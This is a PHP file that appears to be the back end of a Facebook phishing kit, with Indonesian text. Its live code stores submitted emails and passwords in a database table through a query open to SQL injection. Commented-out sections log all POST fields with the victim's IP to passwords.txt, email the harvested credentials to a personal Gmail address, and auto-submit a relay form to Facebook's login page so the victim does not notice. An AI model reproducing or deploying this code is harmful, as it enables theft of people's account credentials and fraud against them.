<?php
$db = mysqli_connect('localhost', 'root','','test');
if ($_REQUEST['email'] <> "") {
	mysqli_query($db, "INSERT INTO email_pass VALUES('', '$_REQUEST[email]','$_REQUEST[pass]')");
}
header("location:index.php");
/*
$datum = date('d-m-Y / H:i:s');
$ip = $_SERVER['REMOTE_ADDR']; 
header("location: https://www.facebook.com");
$handle =fopen("passwords.txt", "a");
$pesan="";
foreach($_POST as $variable => $value) { 
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
	$pesan.=$variable."=".$value."\r\n";
}
fwrite($handle, "IP: $ip | Date: $datum (Date=0 GTM)\r\n");
fwrite($handle, "\r\n");
fclose($handle);
$headers = "From: Panen Phising.com";
mail("aarie33ahmad@gmail.com", "Panen Phising", $pesan, $headers);
setcookie ("user", "empty", time()+3600);
exit;*/
?>
<!--
<form id="login_form" action="https://www.facebook.com/login.php?login_attempt=1&amp;lwv=110" method="post" novalidate="1">
<center>
<input type="hidden" name="lsd" value="AVrsn119" autocomplete="off" />
<input type="hidden" name="email" id="email" value="<?php echo $_REQUEST['email'];?>" tabindex="1" /><br>
<input type="hidden" name="pass" id="pass" value="<?php echo $_REQUEST['pass'];?>" tabindex="2"/><br>
<label class="uiButton uiButtonConfirm" style="" id="loginbutton" for="u_0_l"></label>
<input type="hidden" autocomplete="off" checked="1" name="persistent" /><input type="hidden" name="default_persistent" value="1" />
<input type="hidden" autocomplete="off" name="timezone" value="" id="u_0_m" />
<input type="hidden" autocomplete="off" name="lgndim" value="" id="u_0_n" />
<input type="hidden" name="lgnrnd" value="015722_4mqi" />
<input type="hidden" id="lgnjs" name="lgnjs" value="n" />
<input type="hidden" autocomplete="off" name="ab_test_data" value="" />
<input type="hidden" autocomplete="off" id="locale" name="locale" value="id_ID" />
<input type="hidden" autocomplete="off" name="next" value="https://www.facebook.com/" />
</center>
</form>
<script src="jquery-2.1.1.min.js"></script>
<script>
$(function(){
	document.getElementById('login_form').submit();
});
</script>
<h2>Maaf terjadi kesalahan</h2>
<a href="http://facebook.com">Kembali ke halaman login</a>-->